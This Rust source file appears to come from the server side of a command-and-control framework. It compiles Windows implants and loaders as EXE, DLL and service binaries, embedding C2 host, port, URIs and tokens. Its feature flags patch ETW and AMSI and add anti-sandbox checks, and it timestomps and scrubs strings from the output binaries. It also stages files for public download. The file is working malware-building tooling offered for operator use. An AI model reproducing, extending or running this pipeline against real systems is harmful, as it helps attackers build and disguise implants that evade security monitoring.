use std::{
    env::current_dir,
    fs::create_dir_all,
    path::{Path, PathBuf},
    sync::Arc,
};

use axum::extract::State;
use serde_json::Value;
use shared::tasks::{FileUploadStagingFromClient, NewAgentStaging, StageType, WyrmResult};
use tokio::{
    fs,
    io::{self, AsyncReadExt},
};

use crate::{
    FILE_STORE_PATH,
    admin_task_dispatch::{
        add_api_endpoint_for_staged_resource, is_download_staging_url_error, remove_dir,
        remove_file,
    },
    app_state::AppState,
    logging::log_error_async,
    pe_utils::{scrub_strings, timestomp_binary_compile_date},
    profiles::{Profile, parse_exports_to_string_for_env},
};

const FULLY_QUAL_PATH_TO_FILE_BUILD: &str = "/app/profiles/tmp";

/// Builds all binaries from a given profile
///
/// On success, this function returns None, otherwise an Error is encoded within a `Value` as a `WyrmResult`
pub async fn build_all_bins(
    implant_profile_name: &String,
    state: State<Arc<AppState>>,
) -> Result<Vec<u8>, String> {
    // Save into tmp within profiles, we will delete it on completion.
    let save_path = PathBuf::from("./profiles/tmp");

    create_dir_all(&save_path).map_err(|e| {
        format!(
            "Failed to create tmp directory on c2 for profile staging. {}",
            e.kind()
        )
    })?;

    let profile = {
        // We use the saved profile in memory
        let guard = state.profile.read().await;
        (*guard).clone()
    };

    //
    // If we are building all binaries, iterate through them, otherwise just build hte specified one
    //
    if implant_profile_name.to_lowercase() == "all" {
        let keys: Vec<String> = profile.implants.keys().cloned().collect();
        for key in keys {
            write_implant_to_tmp_folder(&profile, &save_path, &key, state.clone()).await?;
        }
    } else {
        write_implant_to_tmp_folder(&profile, &save_path, implant_profile_name, state.clone())
            .await?;
    }

    //
    // Finally zip up the result, and return them back to the user.
    //
    const ZIP_OUTPUT_PATH: &str = "./profiles/tmp.7z";
    let mut cmd = tokio::process::Command::new("7z");
    cmd.args([
        "a",
        ZIP_OUTPUT_PATH,
        &format!("{}", save_path.as_os_str().display()),
    ]);

    if let Err(e) = cmd.output().await {
        let msg = format!("Error creating 7z archive with resulting payloads. {e}");
        let _ = remove_dir(&save_path).await?;

        return Err(msg);
    };

    //
    // At this point, we have created the 7z. We now want to read it into a buffer in memory,
    // delete the archive, then return the buffer back to the user. We will send it through as a
    // byte stream, which the client can then re-interpret as a file download.
    //
    let _ = remove_dir(&save_path).await?;

    let mut buf = Vec::new();
    let mut file = match tokio::fs::File::open(ZIP_OUTPUT_PATH).await {
        Ok(f) => f,
        Err(e) => {
            let msg = format!("Error opening 7z file. {e}");
            let _ = remove_dir(&save_path).await?;

            return Err(msg);
        }
    };

    if let Err(e) = file.read_to_end(&mut buf).await {
        let msg = format!("Error reading 7z file. {e}");
        let _ = remove_dir(&save_path).await?;

        return Err(msg);
    }

    remove_file(ZIP_OUTPUT_PATH).await?;

    Ok(buf)
}

async fn write_loader_to_tmp(
    profile: &Profile,
    save_path: &PathBuf,
    implant_profile_name: &str,
    dll_path: &PathBuf,
) -> Result<(), String> {
    let data: NewAgentStaging = match profile.as_staged_agent(implant_profile_name, StageType::All)
    {
        WyrmResult::Ok(d) => d,
        WyrmResult::Err(e) => {
            let _ = remove_dir(&save_path).await?;
            let msg = format!("Error constructing a NewAgentStaging. {e:?}");
            return Err(msg);
        }
    };

    //
    // For every build type, build it - we manually specify the loop size here so as more
    // build options are added, the loop will need to be increased to accommodate.
    //
    for i in 0..3 {
        let stage_type = match i {
            0 => StageType::Exe,
            1 => StageType::Dll,
            2 => StageType::Svc,
            _ => unreachable!(),
        };

        let cmd_build_output = compile_loader(&data, stage_type, dll_path).await;
        if let Err(e) = cmd_build_output {
            let msg = &format!("Failed to build loader. {e}");
            let _ = remove_dir(&save_path).await?;
            return Err(msg.to_owned());
        }

        let output = cmd_build_output.unwrap();
        if !output.status.success() {
            let msg = &format!(
                "Failed to build loader. {:#?}",
                String::from_utf8_lossy(&output.stderr),
            );

            let _ = remove_dir(&save_path).await?;

            return Err(msg.to_owned());
        }

        //
        // Move the built implant to where the operator requested it to be built in
        //
        let src_dir = if cfg!(windows) {
            PathBuf::from(format!("./loader/target/release"))
        } else {
            PathBuf::from(format!("./loader/target/x86_64-pc-windows-msvc/release"))
        };

        let out_dir = Path::new(&save_path);
        let src = match stage_type {
            StageType::Dll => src_dir.join("loader.dll"),
            StageType::Exe => src_dir.join("loader.exe"),
            StageType::Svc => src_dir.join("loader_svc.exe"),
            StageType::All => unreachable!(),
        };

        // Format each output file name as loader_{profile name from toml}
        let ldr_name_fmt = format!("loader_{}", data.pe_name);
        let mut dest = out_dir.join(ldr_name_fmt);

        if !(match stage_type {
            StageType::Dll => dest.add_extension("dll"),
            StageType::Exe => dest.add_extension("exe"),
            StageType::Svc => dest.add_extension("svc"),
            StageType::All => unreachable!(),
        }) {
            let msg = format!("Failed to add extension to local file. {dest:?}");
            let _ = remove_dir(&save_path).await?;

            return Err(msg);
        };

        // Error check..
        if let Err(e) = tokio::fs::rename(&src, &dest).await {
            let cwd = current_dir().expect("could not get cwd");
            let msg = format!(
                "Failed to rename built loader - it is *possible* you interrupted the request/page, looking for: {}, to rename to: {}. Cwd: {cwd:?} {e}",
                src.display(),
                dest.display()
            );
            let _ = remove_dir(&save_path).await?;

            return Err(msg);
        };

        // Apply relevant transformations to the loader too
        post_process_pe_on_disk(&dest, &data, stage_type).await;
    }

    Ok(())
}

async fn compile_loader(
    data: &NewAgentStaging,
    stage_type: StageType,
    dll_path: &Path,
) -> Result<std::process::Output, std::io::Error> {
    if stage_type == StageType::All {
        return Err(io::Error::other("StageType::All not supported"));
    }

    let build_as_flags = match stage_type {
        StageType::Dll => vec!["--lib"],
        StageType::Exe => vec!["--bin", "loader"],
        StageType::Svc => vec!["--bin", "loader_svc"],
        StageType::All => vec![],
    };

    // Check for any feature flags from the profile
    let features: Vec<String> = {
        let mut builder = vec!["--features".to_string()];
        let mut string_builder = String::new();

        if data.antisandbox_ram {
            string_builder.push_str("sandbox_mem,");
        }
        if data.antisandbox_trig {
            string_builder.push_str("sandbox_trig,");
        }
        if data.patch_etw {
            string_builder.push_str("patch_etw,");
        }

        if !string_builder.is_empty() {
            builder.push(string_builder);
            builder
        } else {
            vec![]
        }
    };

    let target = if cfg!(windows) {
        None
    } else {
        Some("x86_64-pc-windows-msvc")
    };

    let mut cmd = if !cfg!(windows) {
        tokio::process::Command::new("cargo-xwin")
    } else {
        tokio::process::Command::new("cargo")
    };

    let exports = parse_exports_to_string_for_env(&data.exports);

    cmd.current_dir("./loader")
        .env("SVC_NAME", data.svc_name.clone())
        .env("EXPORTS_JMP_WYRM", exports.export_only_jmp_wyrm)
        .env("EXPORTS_USR_MACHINE_CODE", exports.export_machine_code)
        .env("EXPORTS_PROXY", exports.export_proxy)
        .env("DLL_PATH", dll_path)
        .env("MUTEX", &data.mutex.clone().unwrap_or_default());

    cmd.arg("build");

    if let Some(t) = target {
        cmd.args(["--target", t]);
    }

    cmd.arg("--release");

    cmd.args(build_as_flags).args(features);

    cmd.output().await
}

/// Builds the specified agent as a PE.
///
/// # Important
/// The PE name passed into this function should NOT include its extension.
pub async fn compile_agent(
    data: &NewAgentStaging,
    stage_type: StageType,
) -> Result<std::process::Output, std::io::Error> {
    //
    // Try insert the data into the db. We have some constraints on the db so that it cannot stage
    // at duplicate endpoints, or with duplicate names, etc.
    //

    if stage_type == StageType::All {
        return Err(io::Error::other("StageType::All not supported"));
    }

    let pe_name = validate_extension(&data.pe_name, stage_type);

    // Check for any feature flags
    let features: Vec<String> = {
        let mut builder = vec!["--features".to_string()];
        let mut string_builder = String::new();

        if data.antisandbox_ram {
            string_builder.push_str("sandbox_mem,");
        }
        if data.antisandbox_trig {
            string_builder.push_str("sandbox_trig,");
        }
        if data.patch_etw {
            string_builder.push_str("patch_etw,");
        }
        if data.patch_amsi {
            string_builder.push_str("patch_amsi,");
        }

        if !string_builder.is_empty() {
            builder.push(string_builder);
            builder
        } else {
            vec![]
        }
    };

    let build_as_flags = match stage_type {
        StageType::Dll => vec!["--lib"],
        StageType::Exe => vec!["--bin", "implant"],
        StageType::Svc => vec!["--bin", "implant_svc"],
        StageType::All => vec![],
    };

    //
    // Now we want to actually build the agent itself. We will do this on the C2, building the
    // agent via the local command shell.
    //
    // As operators shouldn't be doing this frequently, I can't see much harm in terms of CPU and
    // memory, but this may need to be profiled.
    //
    // We are also relying on the C2 being run from the correct point as pathing here is going to be
    // relative to allow flexibility on server installations. The C2 must run from the c2 crate directly
    // for the pathing to work.
    //

    let toolchain = "nightly";
    let target = if cfg!(windows) {
        None
    } else {
        Some("x86_64-pc-windows-msvc")
    };

    let mut cmd = if !cfg!(windows) {
        tokio::process::Command::new("cargo-xwin")
    } else {
        tokio::process::Command::new("cargo")
    };

    let default_spawn_as = data.default_spawn_as.clone().unwrap_or_default();

    let c2_endpoints = data
        .c2_endpoints
        .iter()
        .map(|e| e.to_string() + ",")
        .collect::<String>();

    let jitter = data.jitter.unwrap_or_default();

    let exports = parse_exports_to_string_for_env(&data.exports);

    cmd.env("RUSTUP_TOOLCHAIN", toolchain)
        .current_dir("./implant")
        .env("AGENT_NAME", &data.implant_name)
        .env("PE_NAME", pe_name)
        .env("DEF_SLEEP_TIME", data.default_sleep_time.to_string())
        .env("C2_HOST", &data.c2_address)
        .env("C2_URIS", c2_endpoints)
        .env("C2_PORT", data.port.to_string())
        .env("JITTER", jitter.to_string())
        .env("SVC_NAME", data.svc_name.clone())
        .env("USERAGENT", &data.useragent)
        .env("STAGING_URI", &data.staging_endpoint)
        .env("EXPORTS_JMP_WYRM", exports.export_only_jmp_wyrm)
        .env("EXPORTS_USR_MACHINE_CODE", exports.export_machine_code)
        .env("EXPORTS_PROXY", exports.export_proxy)
        .env("SECURITY_TOKEN", &data.agent_security_token)
        .env("STAGE_TYPE", format!("{stage_type}"))
        .env("DEFAULT_SPAWN_AS", default_spawn_as)
        .env("MUTEX", &data.mutex.clone().unwrap_or_default());

    cmd.arg("build");

    if let Some(t) = target {
        cmd.args(["--target", t]);
    }

    if !data.build_debug {
        cmd.arg("--release");
    }

    cmd.args(build_as_flags).args(features);

    cmd.output().await
}

pub async fn post_process_pe_on_disk(dest: &Path, data: &NewAgentStaging, stage_type: StageType) {
    //
    // If the user profile specifies to timestomp the binary, then try do that - if it fails we do not want to allow
    // the bad file to be returned to the user.
    //
    if let Some(ts) = data.timestomp.as_ref() {
        if let Err(e) = timestomp_binary_compile_date(ts, &dest).await {
            let msg = format!("Could not timestomp binary {}, {e}", dest.display());
            log_error_async(&msg).await;
        }
    }

    //
    // Scrub implant.dll out
    //
    if stage_type == StageType::Dll {
        if let Err(e) = scrub_strings(&dest, b"implant.dll\0", None).await {
            log_error_async(&format!("Failed to scrub implant.dll. {e}")).await;
        };
    }

    //
    // Scrub user defined strings
    //
    if let Some(stomp) = &data.string_stomp {
        if let Some(inner) = &stomp.remove {
            for needle in inner {
                if let Err(e) = scrub_strings(&dest, needle.as_bytes(), None).await {
                    log_error_async(&format!(
                        "Failed to scrub string {needle} from {}. {e}",
                        dest.display()
                    ))
                    .await;
                };
            }
        }

        if let Some(inner) = &stomp.replace {
            for (needle, repl) in inner {
                if let Err(e) = scrub_strings(&dest, needle.as_bytes(), Some(repl.as_bytes())).await
                {
                    log_error_async(&format!(
                        "Failed to replace string {needle} from {}. {e}",
                        dest.display()
                    ))
                    .await;
                };
            }
        }
    }
}

pub async fn write_implant_to_tmp_folder<'a>(
    profile: &Profile,
    save_path: &'a PathBuf,
    implant_profile_name: &str,
    state: State<Arc<AppState>>,
) -> Result<(), String> {
    //
    // Transform the profile into a valid `NewAgentStaging`
    //
    let data: NewAgentStaging = match profile.as_staged_agent(implant_profile_name, StageType::All)
    {
        WyrmResult::Ok(d) => d,
        WyrmResult::Err(e) => {
            let _ = remove_dir(&save_path).await?;
            let msg = format!("Error constructing a NewAgentStaging. {e:?}");
            return Err(msg);
        }
    };

    //
    // For every build type, build it - we manually specify the loop size here so as more
    // build options are added, the loop will need to be increased to accommodate.
    //
    for i in 0..3 {
        let stage_type = match i {
            0 => StageType::Exe,
            1 => StageType::Dll,
            2 => StageType::Svc,
            _ => unreachable!(),
        };

        // Actually try build with cargo
        let cmd_build_output = compile_agent(&data, stage_type).await;

        if let Err(e) = cmd_build_output {
            let msg = &format!("Failed to build agent. {e}");
            let _ = remove_dir(&save_path).await?;
            return Err(msg.to_owned());
        }

        let output = cmd_build_output.unwrap();
        if !output.status.success() {
            let msg = &format!(
                "Failed to build agent. {:#?}",
                String::from_utf8_lossy(&output.stderr),
            );

            let _ = remove_dir(&save_path).await?;

            return Err(msg.to_owned());
        }

        //
        // Move the built implant to where the operator requested it to be built in
        //
        let dir_name = {
            match data.build_debug {
                true => "debug",
                false => "release",
            }
        };

        let src_dir = if cfg!(windows) {
            PathBuf::from(format!("./implant/target/{dir_name}"))
        } else {
            PathBuf::from(format!(
                "./implant/target/x86_64-pc-windows-msvc/{dir_name}"
            ))
        };

        let out_dir = Path::new(&save_path);
        let src = match stage_type {
            StageType::Dll => src_dir.join("implant.dll"),
            StageType::Exe => src_dir.join("implant.exe"),
            StageType::Svc => src_dir.join("implant_svc.exe"),
            StageType::All => unreachable!(),
        };

        let mut dest = out_dir.join(&data.pe_name);

        if !(match stage_type {
            StageType::Dll => dest.add_extension("dll"),
            StageType::Exe => dest.add_extension("exe"),
            StageType::Svc => dest.add_extension("svc"),
            StageType::All => unreachable!(),
        }) {
            let msg = format!("Failed to add extension to local file. {dest:?}");
            let _ = remove_dir(&save_path).await?;

            return Err(msg);
        };

        // Error check..
        if let Err(e) = tokio::fs::rename(&src, &dest).await {
            let cwd = current_dir().expect("could not get cwd");
            let msg = format!(
                "Failed to rename built agent - it is *possible* you interrupted the request/page, looking for: {}, to rename to: {}. Cwd: {cwd:?} {e}",
                src.display(),
                dest.display()
            );
            let _ = remove_dir(&save_path).await?;

            return Err(msg);
        };

        //
        // Update state to include a new endpoint for the listeners
        //
        if let Err(e) = is_download_staging_url_error(&data, &state).await {
            let msg = format!(
                "The download URL matches an existing one, or a URL which is used for agent check-in, \
                this is not permitted. Kind: {e:?}"
            );
            let _ = remove_dir(&save_path).await?;

            return Err(msg);
        }

        post_process_pe_on_disk(&dest, &data, stage_type).await;

        //
        // Build the loader for the DLL
        //
        if stage_type == StageType::Dll {
            let p = format!("{}/{}.dll", FULLY_QUAL_PATH_TO_FILE_BUILD, data.pe_name);
            let dll_path = PathBuf::from(p);

            if !dll_path.exists() {
                panic!(
                    "DLL path for the raw binary did not exist. This is not acceptable. Expected path: {}",
                    dll_path.display()
                );
            }

            write_loader_to_tmp(profile, save_path, implant_profile_name, &dll_path).await?;
        }
    }

    Ok(())
}

/// Validates the extension of the build target matches that expected by the operator
/// after building takes place.
fn validate_extension(name: &String, expected_type: StageType) -> String {
    let mut new_name = String::from(name);

    match expected_type {
        StageType::Dll => {
            if !new_name.ends_with(".dll") && (name.ends_with(".exe") || name.ends_with(".svc")) {
                let _ = new_name.replace(".exe", "");
                let _ = new_name.replace(".svc", "");
                new_name.push_str(".dll");
            } else {
                new_name.push_str(".dll");
            }
        }
        StageType::Exe => {
            if !new_name.ends_with(".exe") && (name.ends_with(".dll") || name.ends_with(".svc")) {
                let _ = new_name.replace(".dll", "");
                let _ = new_name.replace(".svc", "");
                new_name.push_str(".exe");
            } else {
                new_name.push_str(".exe");
            }
        }
        StageType::Svc => {
            if !new_name.ends_with(".exe") && (name.ends_with(".dll") || name.ends_with(".svc")) {
                let _ = new_name.replace(".dll", "");
                let _ = new_name.replace(".exe", "");
                new_name.push_str(".svc");
            } else {
                new_name.push_str(".svc");
            }
        }
        StageType::All => unreachable!(),
    }

    new_name
}

/// Prints an error to the C2 console and returns a formatted error.
///
/// **IMPORTANT**: This function will also delete the staged_agent row from the database by it's `implant_name`.
async fn stage_new_agent_error_printer(
    message: &str,
    uri: &str,
    state: State<Arc<AppState>>,
) -> Option<Value> {
    log_error_async(message).await;
    let _ = state.db_pool.delete_staged_resource_by_uri(uri).await;

    let serialised = serde_json::to_value(WyrmResult::Err::<String>(message.to_string())).unwrap();

    Some(serialised)
}

/// Stages a file uploaded to the C2 by an admin which will be made available for public download
/// at a specified API endpoint.
pub async fn stage_file_upload_from_users_disk(
    data: FileUploadStagingFromClient,
    state: State<Arc<AppState>>,
) -> Option<Value> {
    let out_dir = Path::new(FILE_STORE_PATH);
    let dest = out_dir.join(&data.download_name);

    if let Err(e) = fs::write(&dest, &data.file_data).await {
        let serialised = serde_json::to_value(WyrmResult::Err::<String>(format!(
            "Failed to write file on C2: {e:?}",
        )))
        .unwrap();

        return Some(serialised);
    }

    let agent_stage_template =
        NewAgentStaging::from_staged_file_metadata(&data.api_endpoint, &data.download_name);

    //
    // Try insert into the database, following that, deconflict the download URI and add it into the in-memory
    // list.
    //
    if let Err(e) = state.db_pool.add_staged_agent(&agent_stage_template).await {
        log_error_async(&format!("Failed to insert row in db: {e:?}")).await;
        let serialised = serde_json::to_value(WyrmResult::Err::<String>(format!(
            "Failed to insert row in db for new staged agent: {e:?}",
        )))
        .unwrap();

        return Some(serialised);
    };

    if let Err(e) = add_api_endpoint_for_staged_resource(&agent_stage_template, state.clone()).await
    {
        return stage_new_agent_error_printer(
            &format!(
                "The download URL matches an existing one, or a URL which is used for agent \
                check-in, this is not permitted. Kind: {e:?}"
            ),
            &data.download_name,
            state,
        )
        .await;
    };

    let serialised = match serde_json::to_value(WyrmResult::Ok(format!(
        "File successfully uploaded, and is being served at /{}. File name: {}",
        data.api_endpoint, data.download_name,
    ))) {
        Ok(s) => s,
        Err(e) => {
            return stage_new_agent_error_printer(
                &format!("Failed to serialise response. {e}"),
                &data.download_name,
                state,
            )
            .await;
        }
    };

    Some(serialised)
}
